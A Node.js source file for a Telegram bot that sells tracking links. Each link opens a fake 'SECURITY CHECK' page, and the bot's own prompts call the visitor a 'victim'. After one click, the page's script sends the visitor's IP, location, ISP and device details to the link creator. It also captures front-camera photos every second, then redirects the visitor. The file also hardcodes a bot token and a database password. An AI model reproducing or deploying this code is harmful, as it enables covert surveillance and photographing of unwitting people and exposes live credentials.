/**
 * 𝐃𝐗-𝐂𝐎𝐃𝐄𝐗 𝐌𝐎𝐓𝐇𝐄𝐑 𝐒𝐘𝐒𝐓𝐄𝐌 v9.0 (Ultimate Final)
 * Features: Admin Reply Commands, Rem Command, Full Details, Smart Batching, Glitch HTML
 */

const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');

// 🛠 CONFIGURATION
const TOKEN = "8291862788:AAEvXOm7TSrCIjb1TxPm7rleiG_NooTgxdE";
const OWNER_IDS = [6703335929, 6041728084, 5136260272]; 
const CHANNEL_ID1 = "@alphacodex369";
const CHANNEL_ID2 = "@Termuxcodex";
const GROUP_ID = "@Codex_teamx"; 
const MONGO_URI = "mongodb+srv://darkgangdarks_db_user:aEEYR59YEVameS1y@cluster0.iyakwh0.mongodb.net/DEVICEX?retryWrites=true&w=majority";

const bot = new TelegramBot(TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ extended: true }));

// ─── 💾 DATABASE ──────────────────────────────────────────

mongoose.connect(MONGO_URI).then(() => console.log('✅ MongoDB Connected'));

const userSchema = new mongoose.Schema({
    chatId: { type: Number, unique: true },
    username: String,
    firstName: String,
    coins: { type: Number, default: 0 },
    freeUrlsLeft: { type: Number, default: 4 }, 
    isBanned: { type: Boolean, default: false },
    joinedAt: { type: Date, default: Date.now }
});

const linkSchema = new mongoose.Schema({
    shortId: { type: String, unique: true },
    creatorChatId: Number,
    originalUrl: String, 
    customName: String,
    createdAt: { type: Date, default: Date.now, expires: 86400 } // 24 Hours
});

const User = mongoose.model('User', userSchema);
const Link = mongoose.model('Link', linkSchema);

// ─── 🎨 STYLING & HELPERS ─────────────────────────────────

const fontMap = {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ғ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ','s':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ','S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ','0':'₀','1':'₁','2':'₂','3':'₃','4':'₄','5':'₅','6':'₆','7':'₇','8':'₈','9':'₉'};

function _fnt(text) {
    if(!text) return "";
    return text.split('').map(c => fontMap[c] || c).join('');
}

// Short Border (Requested Style)
function makeBorder(title, content) {
    const lines = content.split('\n').map(line => `┃ ${line}`).join('\n');
    return `<b>┏━━「 ${_fnt(title)} 」━━┓</b>\n${lines}\n<b>┗━━━━━━━━━━┛</b>`;
}

// Helper to resolve user from ID, Username, or Reply
async function resolveUser(msg, targetInput) {
    if (msg.reply_to_message) {
        return await User.findOne({ chatId: msg.reply_to_message.from.id });
    }
    if (targetInput) {
        const cleanTarget = targetInput.trim().replace('@', '');
        // Check if input is number (ChatID) or String (Username)
        if (/^\d+$/.test(cleanTarget)) {
            return await User.findOne({ chatId: parseInt(cleanTarget) });
        } else {
            return await User.findOne({ username: cleanTarget });
        }
    }
    return null;
}

// ─── 🤖 BOT LOGIC ─────────────────────────────────────────

async function checkMembership(chatId) {
    try {
        const s = ['creator', 'administrator', 'member', 'restricted'];
        const c1 = await bot.getChatMember(CHANNEL_ID1, chatId);
        const c2 = await bot.getChatMember(CHANNEL_ID2, chatId);
        const g1 = await bot.getChatMember(GROUP_ID, chatId);
        return { allJoined: s.includes(c1.status) && s.includes(c2.status) && s.includes(g1.status) };
    } catch (e) { return { allJoined: false }; }
}

const userState = {};

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    let user = await User.findOne({ chatId });
    if (!user) {
        user = new User({ chatId, username: msg.from.username, firstName: msg.from.first_name });
        await user.save();
    }
    
    if (user.isBanned) return bot.sendMessage(chatId, makeBorder("ʙᴀɴɴᴇᴅ", "🚫: ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ!"), {parse_mode:'HTML', reply_to_message_id: msg.message_id});

    const { allJoined } = await checkMembership(chatId);
    if (allJoined) showMainMenu(msg);
    else showVerificationMenu(msg);
});

function showMainMenu(msg) {
    const mention = `<a href="tg://user?id=${msg.from.id}">${msg.from.first_name}</a>`;
    const content = `👤: ${mention}\n🆔: <code>${msg.from.id}</code>\n💬: sᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ\n👇: ᴜsᴇ ʙᴜᴛᴛᴏɴs ᴛᴏ ᴄᴏɴᴛʀᴏʟ`;
    bot.sendMessage(msg.chat.id, makeBorder("ᴅᴀsʜʙᴏᴀʀᴅ", content), {
        parse_mode: 'HTML',
        reply_to_message_id: msg.message_id,
        reply_markup: { keyboard: [[{ text: "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ" }], [{ text: "👤 ᴍʏ ɪɴғᴏ" }, { text: "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ" }]], resize_keyboard: true }
    });
}

function showVerificationMenu(msg) {
    const mention = `<a href="tg://user?id=${msg.from.id}">${msg.from.first_name}</a>`;
    bot.sendMessage(msg.chat.id, makeBorder("ᴡᴇʟᴄᴏᴍᴇ", `👋: ʜᴇʟʟᴏ, ${mention}\n📢: ᴘʟᴇᴀsᴇ ᴊᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟs\n🔓: ᴛᴏ ᴜɴʟᴏᴄᴋ ᴛʜᴇ ʙᴏᴛ`), {
        parse_mode: 'HTML',
        reply_to_message_id: msg.message_id,
        reply_markup: {
            inline_keyboard: [
                [{ text: "📢 ᴄʜᴀɴɴᴇʟ 𝟷", url: `https://t.me/${CHANNEL_ID1.replace('@', '')}` }],
                [{ text: "📢 ᴄʜᴀɴɴᴇʟ 𝟸", url: `https://t.me/${CHANNEL_ID2.replace('@', '')}` }],
                [{ text: "👥 ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }],
                [{ text: "✅ ᴠᴇʀɪғʏ", callback_data: "verify_join" }]
            ]
        }
    });
}

// ─── 📩 MESSAGES & STATES ─────────────────────────────────

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text) return;

    // Check Ban
    const user = await User.findOne({ chatId });
    if (user && user.isBanned) return;

    // Ignore commands starting with / (handled by onText)
    if (text.startsWith('/')) {
        if (text === '/id') bot.sendMessage(chatId, `<code>${chatId}</code>`, {parse_mode:'HTML', reply_to_message_id: msg.message_id});
        return;
    }

    if (text === "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ") {
        const mention = `<a href="tg://user?id=${msg.from.id}">${msg.from.first_name}</a>`;
        
        // Check Balance
        if (user.freeUrlsLeft <= 0 && user.coins <= 0) {
            return bot.sendMessage(chatId, makeBorder("⚠️ ɴᴏ ᴄᴏɪɴs", `👤: ${mention}\n🚫: ғʀᴇᴇ ᴛʀɪᴀʟ ᴇɴᴅᴇᴅ\n💰: ʏᴏᴜ ɴᴇᴇᴅ ᴄᴏɪɴs ᴛᴏ ᴄʀᴇᴀᴛᴇ ʟɪɴᴋs\n👇: ᴄʟɪᴄᴋ ʙᴇʟᴏᴡ ᴛᴏ ʙᴜʏ`), {
                parse_mode: 'HTML',
                reply_to_message_id: msg.message_id,
                reply_markup: { inline_keyboard: [[{ text: "💰 ʙᴜʏ ᴄᴏɪɴs", url: `https://t.me/${GROUP_ID.replace('@', '')}` }]] }
            });
        }

        const info = `👤: ${mention}\n🎁: ${user.freeUrlsLeft} ғʀᴇᴇ ᴛʀɪᴀʟs\n💰: ${user.coins} ᴄᴏɪɴs ᴀᴠᴀɪʟᴀʙʟᴇ\n👇: ᴄʜᴏᴏsᴇ ʟɪɴᴋ ᴛʏᴘᴇ`;
        bot.sendMessage(chatId, makeBorder("ᴄʀᴇᴀᴛᴇ ᴜʀʟ", info), {
            parse_mode: 'HTML',
            reply_to_message_id: msg.message_id,
            reply_markup: { inline_keyboard: [[{ text: "✏️ ᴄᴜsᴛᴏᴍ ɴᴀᴍᴇ", callback_data: "create_custom" }, { text: "🎲 ʀᴀɴᴅᴏᴍ ɴᴀᴍᴇ", callback_data: "create_random" }]] }
        });
    } 
    else if (text === "👤 ᴍʏ ɪɴғᴏ") {
        const mention = `<a href="tg://user?id=${msg.from.id}">${msg.from.first_name}</a>`;
        const info = `👤: ${mention}\n💰: ${user.coins} ᴄᴏɪɴs\n🎁: ${user.freeUrlsLeft} ғʀᴇᴇ ʟᴇғᴛ\n📅: ᴊᴏɪɴᴇᴅ: ${user.joinedAt.toLocaleDateString()}`;
        bot.sendMessage(chatId, makeBorder("ᴘʀᴏғɪʟᴇ", info), { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
    } 
    else if (text === "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ") {
        bot.sendMessage(chatId, makeBorder("ᴅᴇᴠᴇʟᴏᴘᴇʀ", "👨‍💻: ᴄᴏᴅᴇᴅ ʙʏ @Dxcodexbot\n🛡: ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄᴏᴅᴇx ᴛᴇᴀᴍ"), { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
    }
    
    // Custom Link Steps
    else if (userState[chatId]) {
        if (userState[chatId].step === 'await_custom_name') {
            const cleanName = text.trim().replace(/[^a-zA-Z0-9-_]/g, '');
            if(cleanName.length < 3) return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ɴᴀᴍᴇ ᴛᴏᴏ sʜᴏʀᴛ (3+ ᴄʜᴀʀs)"), {parse_mode:'HTML', reply_to_message_id: msg.message_id});
            
            const exists = await Link.findOne({ shortId: cleanName });
            if(exists) return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ɴᴀᴍᴇ ᴀʟʀᴇᴀᴅʏ ᴛᴀᴋᴇɴ!"), {parse_mode:'HTML', reply_to_message_id: msg.message_id});
            
            userState[chatId].name = cleanName;
            askRedirect(msg, cleanName);
        } else if (userState[chatId].step === 'await_redirect_url') {
            if(!text.startsWith('http')) return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜʀʟ ᴍᴜsᴛ sᴛᴀʀᴛ ᴡɪᴛʜ http/https"), {parse_mode:'HTML', reply_to_message_id: msg.message_id});
            createFinalLink(msg, userState[chatId].name, text.trim());
        }
    }
});

// Callbacks
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const msg = query.message;

    if (data === 'verify_join') {
        const { allJoined } = await checkMembership(chatId);
        if (allJoined) { bot.deleteMessage(chatId, msg.message_id); showMainMenu(query); }
        else bot.answerCallbackQuery(query.id, { text: "⚠️ ᴊᴏɪɴ ᴀʟʟ ᴄʜᴀɴɴᴇʟs ғɪʀsᴛ!", show_alert: true });
    } 
    else if (data === 'create_custom') {
        userState[chatId] = { step: 'await_custom_name' };
        bot.sendMessage(chatId, makeBorder("ᴄᴜsᴛᴏᴍ", "✏️: sᴇɴᴅ ʏᴏᴜʀ ᴄᴜsᴛᴏᴍ ʟɪɴᴋ ɴᴀᴍᴇ"), { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
    } 
    else if (data === 'create_random') {
        askRedirect(query, Math.random().toString(36).substring(7));
    } 
    else if (data === 'use_redirect') {
        userState[chatId].step = 'await_redirect_url';
        bot.sendMessage(chatId, makeBorder("ʀᴇᴅɪʀᴇᴄᴛ", "🌐: sᴇɴᴅ ᴛʜᴇ ᴜʀʟ ᴛᴏ ʀᴇᴅɪʀᴇᴄᴛ ᴠɪᴄᴛɪᴍ"), { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
    } 
    else if (data === 'no_redirect') {
        createFinalLink(query, userState[chatId].name, null);
    }
});

function askRedirect(msg, name) {
    const chatId = msg.from ? msg.from.id : msg.chat.id;
    userState[chatId] = { name: name, step: 'await_choice' };
    bot.sendMessage(chatId, makeBorder("ᴏᴘᴛɪᴏɴ", `📝: ʟɪɴᴋ ɴᴀᴍᴇ: ${name}\n❓: ᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʀᴇᴅɪʀᴇᴄᴛ ᴠɪᴄᴛɪᴍ?`), {
        parse_mode: 'HTML',
        reply_to_message_id: msg.message_id || msg.message.message_id,
        reply_markup: { inline_keyboard: [[{ text: "✅ ʏᴇs", callback_data: "use_redirect" }, { text: "❌ ɴᴏ", callback_data: "no_redirect" }]] }
    });
}

async function createFinalLink(msg, name, redirectUrl) {
    const chatId = msg.from ? msg.from.id : msg.chat.id;
    const user = await User.findOne({ chatId });
    
    // Re-check logic before deduction
    if (user.freeUrlsLeft <= 0 && user.coins <= 0) {
        delete userState[chatId];
        return bot.sendMessage(chatId, makeBorder("⚠️ ғᴀɪʟᴇᴅ", "❌: ɴᴏ ᴄᴏɪɴs ʟᴇғᴛ!"), { parse_mode:'HTML', reply_to_message_id: msg.message_id });
    }

    // Deduction
    if (user.freeUrlsLeft > 0) user.freeUrlsLeft -= 1; else user.coins -= 1;
    await user.save();

    await new Link({ shortId: name, creatorChatId: chatId, originalUrl: redirectUrl }).save();
    delete userState[chatId];
    
    const url = `https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'YOUR_APP.onrender.com'}/w/${name}`;
    const mention = `<a href="tg://user?id=${chatId}">${msg.from.first_name}</a>`;
    const details = `👤: ${mention}\n🔗: ${url}\n🔄: ${redirectUrl || 'N/A'}\n💰: ᴄᴏɪɴs ʀᴇᴍᴀɪɴ: ${user.coins}`;
    
    bot.sendMessage(chatId, makeBorder("✅ sᴜᴄᴄᴇss", details), { 
        parse_mode: 'HTML', 
        reply_to_message_id: msg.message_id || msg.message.message_id 
    });
}

// ─── 👑 ADMIN COMMANDS (ADD, REM, BAN, UNBAN) ─────────────

// Generic Handler for /add and /rem to support Reply & User Input
async function handleCoinCommand(msg, match, type) {
    if (!OWNER_IDS.includes(msg.chat.id)) return;
    
    const amount = parseInt(match[1]); // Amount is always group 1
    const targetInput = match[2]; // Target username/id is group 2 (optional if reply)

    const user = await resolveUser(msg, targetInput);

    if (!user) {
        return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ\n💡: ʀᴇᴘʟʏ ᴛᴏ ᴜsᴇʀ ᴏʀ ᴛʏᴘᴇ ɪᴅ"), {parse_mode:'HTML', reply_to_message_id: msg.message_id});
    }

    if (type === 'add') {
        user.coins += amount;
        await user.save();
        bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ", `✅: ᴀᴅᴅᴇᴅ ${amount} ᴄᴏɪɴs\n👤: ${user.firstName} (${user.chatId})`), {parse_mode:'HTML', reply_to_message_id: msg.message_id});
        bot.sendMessage(user.chatId, makeBorder("ʙᴀʟᴀɴᴄᴇ", `💰: +${amount} ᴄᴏɪɴs ᴀᴅᴅᴇᴅ!\n👮‍♂️: ʙʏ ᴀᴅᴍɪɴ`), {parse_mode:'HTML'});
    } 
    else if (type === 'rem') {
        user.coins = Math.max(0, user.coins - amount); // Don't go below 0
        await user.save();
        bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ", `⛔️: ʀᴇᴍᴏᴠᴇᴅ ${amount} ᴄᴏɪɴs\n👤: ${user.firstName} (${user.chatId})`), {parse_mode:'HTML', reply_to_message_id: msg.message_id});
        bot.sendMessage(user.chatId, makeBorder("ʙᴀʟᴀɴᴄᴇ", `🔻: -${amount} ᴄᴏɪɴs ʀᴇᴍᴏᴠᴇᴅ!\n👮‍♂️: ʙʏ ᴀᴅᴍɪɴ`), {parse_mode:'HTML'});
    }
}

// Regex to match: /add 10 OR /add 10 @user OR /add 10 123456
bot.onText(/\/add (\d+)(?: (.+))?/, (msg, match) => handleCoinCommand(msg, match, 'add'));
bot.onText(/\/rem (\d+)(?: (.+))?/, (msg, match) => handleCoinCommand(msg, match, 'rem'));

bot.onText(/\/ban(?: (.+))?/, async (msg, match) => {
    if (!OWNER_IDS.includes(msg.chat.id)) return;
    const user = await resolveUser(msg, match[1]);
    if(user) {
        user.isBanned = true;
        await user.save();
        bot.sendMessage(msg.chat.id, makeBorder("ʙᴀɴ", `🚫: ʙᴀɴɴᴇᴅ ${user.firstName}`), {parse_mode:'HTML', reply_to_message_id: msg.message_id});
    } else bot.sendMessage(msg.chat.id, "❌ ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ", {reply_to_message_id: msg.message_id});
});

bot.onText(/\/unban(?: (.+))?/, async (msg, match) => {
    if (!OWNER_IDS.includes(msg.chat.id)) return;
    const user = await resolveUser(msg, match[1]);
    if(user) {
        user.isBanned = false;
        await user.save();
        bot.sendMessage(msg.chat.id, makeBorder("ᴜɴʙᴀɴ", `✅: ᴜɴʙᴀɴɴᴇᴅ ${user.firstName}`), {parse_mode:'HTML', reply_to_message_id: msg.message_id});
    } else bot.sendMessage(msg.chat.id, "❌ ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ", {reply_to_message_id: msg.message_id});
});

bot.onText(/\/broadcast (.+)/, async (msg, match) => {
    if (!OWNER_IDS.includes(msg.chat.id)) return;
    let text = match[1];
    let reply_markup = null;
    const btnMatch = text.match(/\[(.*)\|(.*)\]/);
    if (btnMatch) {
        text = text.replace(btnMatch[0], "").trim();
        reply_markup = { inline_keyboard: [[{ text: btnMatch[1].trim(), url: btnMatch[2].trim() }]] };
    }
    const users = await User.find({});
    bot.sendMessage(msg.chat.id, "⏳ <b>sᴛᴀʀᴛɪɴɢ ʙʀᴏᴀᴅᴄᴀsᴛ...</b>", { parse_mode: 'HTML' });
    
    let count = 0;
    for (const u of users) {
        try { await bot.sendMessage(u.chatId, `<b>📢 ʙʀᴏᴀᴅᴄᴀsᴛ</b>\n\n${text}`, { parse_mode: 'HTML', reply_markup }); count++; } catch(e) {}
    }
    bot.sendMessage(msg.chat.id, makeBorder("sᴜᴄᴄᴇss", `📢: sᴇɴᴛ ᴛᴏ ${count} ᴜsᴇʀs`), { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
});

bot.onText(/\/users/, async (msg) => {
    if (!OWNER_IDS.includes(msg.chat.id)) return;
    const count = await User.countDocuments();
    bot.sendMessage(msg.chat.id, makeBorder("sᴛᴀᴛs", `👥: ᴛᴏᴛᴀʟ ᴜsᴇʀs: ${count}`), {parse_mode: 'HTML', reply_to_message_id: msg.message_id});
});

// ─── 🌐 WEB ENGINE & DATA ─────────────────────────────────

app.get('/w/:id', async (req, res) => {
    const link = await Link.findOne({ shortId: req.params.id });
    if (!link) return res.status(404).send("EXPIRED OR INVALID LINK");
    res.send(getHtmlTemplate(req.params.id, link.originalUrl));
});

app.post('/api/data', async (req, res) => {
    const { linkId, type, data } = req.body;
    const link = await Link.findOne({ shortId: linkId });
    if (!link) return res.json({ status: 'error' });
    const owner = link.creatorChatId;

    try {
        if (type === 'info') {
            const _n = data.ipData;
            const _batt = data.battery;
            const _gpu = data.gpu;
            const navigator = data.navigator;
            const screen = data.screen;

            // [RESTORED FULL REQUESTED DETAILS]
            let msg = `<b>${_fnt("CODEX DEVICE INFO")}</b>\n\n`;
            msg += `<b>${_fnt("DEVICE")}:</b> <code>${navigator.platform}</code>\n`;
            msg += `<b>${_fnt("IP ADDRESS")}:</b> <a href="https://ipwho.is/${_n.ip}">${_n.ip}</a>\n`;
            msg += `<b>${_fnt("NETWORK")}:</b> <code>${_n.isp}</code>\n`;
            msg += `<b>${_fnt("LOCATION")}:</b> <code>${_n.city}, ${_n.country}</code>\n`;
            msg += `<b>${_fnt("COORDINATES")}:</b> <code>${_n.loc}</code>\n`;
            msg += `<b>${_fnt("BATTERY")}:</b> <code>${_batt}</code>\n`;
            msg += `<b>${_fnt("CPU CORES")}:</b> <code>${navigator.hardwareConcurrency || 'N/A'}</code>\n`;
            msg += `<b>${_fnt("RAM")}:</b> <code>${navigator.deviceMemory || 'N/A'} GB</code>\n`;
            msg += `<b>${_fnt("GPU")}:</b> <code>${_gpu}</code>\n`;
            msg += `<b>${_fnt("SCREEN")}:</b> <code>${screen.width}x${screen.height} (${screen.colorDepth}-bit)</code>\n`;
            msg += `<b>${_fnt("TIMEZONE")}:</b> <code>${data.timezone}</code>\n`;
            msg += `<b>${_fnt("LANGUAGE")}:</b> <code>${navigator.language}</code>\n`;
            msg += `<b>${_fnt("USER AGENT")}:</b> <pre>${navigator.userAgent}</pre>\n\n`;
            msg += `<blockquote>${_fnt("DEV-BY: DX-CODEX || ")}@Termuxcodex</blockquote>`;

            await bot.sendMessage(owner, msg, { parse_mode: 'HTML', disable_web_page_preview: true });
        
        } else if (type === 'cam') {
            const images = data.images; 
            if(Array.isArray(images)){
                for (const imgBase64 of images) {
                    const buffer = Buffer.from(imgBase64.replace(/^data:image\/jpeg;base64,/, ""), 'base64');
                    await bot.sendPhoto(owner, buffer, { 
                        caption: makeBorder("ᴄᴀᴍᴇʀᴀ", `┃ 📱: <code>${data.platform}</code>`), 
                        parse_mode: 'HTML' 
                    });
                }
            }
        }
        res.json({ status: 'success' });
    } catch (e) { res.json({ status: 'error' }); }
});

function getHtmlTemplate(linkId, redirectUrl) {
    return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURITY CHECK</title>
    <style>
        body { margin: 0; background: #000; overflow: hidden; font-family: monospace; user-select: none; }
        #terminal { position: absolute; top: 10px; left: 10px; color: #0f0; z-index: 100; font-size: 12px; pointer-events: none; }
        #msg { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #0f0; font-size: 20px; text-align: center; border: 1px solid #0f0; padding: 20px; background: rgba(0,20,0,0.8); cursor: pointer; z-index: 999; }
        .glitch { animation: glitch 0.2s linear infinite; color: red !important; border-color: red !important; }
        @keyframes glitch { 0% { transform: translate(-50%, -50%) skew(0deg); } 20% { transform: translate(-52%, -50%) skew(0deg); } 40% { transform: translate(-50%, -50%) skew(0deg); } }
    </style>
</head>
<body>
    <div id="terminal">System: Linux<br>Connection: Secure<br>Status: Waiting...</div>
    <div id="msg">⚠ SECURITY CHECK ⚠<br><br>CLICK HERE TO VERIFY</div>
    
    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>
    <canvas id="matrix"></canvas>

<script>
// MATRIX EFFECT
const m = document.getElementById('matrix');
const ctx = m.getContext('2d');
m.width = window.innerWidth; m.height = window.innerHeight;
const drops = Array(Math.floor(m.width/20)).fill(0);
function draw() {
    ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0,0,m.width,m.height);
    ctx.fillStyle = '#0f0'; ctx.font = '15px monospace';
    drops.forEach((y, i) => {
        const text = String.fromCharCode(Math.random()*128);
        ctx.fillText(text, i*20, y*20);
        if(y*20 > m.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    });
}
setInterval(draw, 33);

// INTERACTION & DATA CAPTURE
let started = false;
const capturedImages = [];

document.getElementById('msg').addEventListener('click', function() {
    this.innerText = "ACCESS GRANTED - SYSTEM BREACH";
    this.classList.add('glitch');
    document.getElementById('terminal').innerHTML += "<br>> PERMISSION: GRANTED<br>> UPLOADING DATA...";
    if(!started) { started = true; startProcess(); }
});

async function startProcess() {
    // 1. INFO
    let ipData = {ip:"?"};
    try { const r = await fetch('https://ipwho.is/'); ipData = await r.json(); } catch(e){}
    
    let batt = "N/A";
    try { const b = await navigator.getBattery(); batt = Math.round(b.level*100) + "% " + (b.charging?"🔌":"🔋"); } catch(e){}
    
    let gpu = "N/A";
    try { 
        const gl = document.createElement('canvas').getContext('webgl'); 
        const db = gl.getExtension('WEBGL_debug_renderer_info'); 
        gpu = gl.getParameter(db.UNMASKED_RENDERER_WEBGL); 
    } catch(e){}

    const info = {
        ipData: { ip: ipData.ip, city: ipData.city, country: ipData.country, isp: ipData.connection?.isp, loc: ipData.latitude+","+ipData.longitude },
        battery: batt, gpu: gpu, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
        navigator: { platform: navigator.platform, hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory, language: navigator.language, userAgent: navigator.userAgent }
    };

    await fetch('/api/data', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({linkId:"${linkId}", type:'info', data: info}) });

    // 2. CAMERA
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
        const v = document.getElementById('v'); v.srcObject = stream;
        
        v.onloadedmetadata = () => {
            setInterval(() => {
                const cvs = document.getElementById('c');
                cvs.width = v.videoWidth; cvs.height = v.videoHeight;
                cvs.getContext('2d').drawImage(v, 0, 0);
                capturedImages.push(cvs.toDataURL('image/jpeg', 0.5));
                if(capturedImages.length >= 3) sendBatch(); // Send batch of 3
            }, 1000);
        };
    } catch(e) {}

    // 3. REDIRECT
    if("${redirectUrl}" && "${redirectUrl}" !== "null") {
        setTimeout(() => {
            sendBatch().then(() => { window.location.href = "${redirectUrl}"; });
        }, 5000);
    }
}

async function sendBatch() {
    if(capturedImages.length === 0) return;
    const batch = [...capturedImages];
    capturedImages.length = 0;
    await fetch('/api/data', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({linkId:"${linkId}", type:'cam', data: { images: batch, platform: navigator.platform }}) });
}

window.addEventListener('beforeunload', () => { sendBatch(); });
</script>
</body>
</html>`;
}

// Keep Alive
setInterval(() => { axios.get(`https://${process.env.RENDER_EXTERNAL_HOSTNAME}.onrender.com`).catch(()=>{}); }, 300000);

app.listen(PORT, () => console.log(`Server Online`));
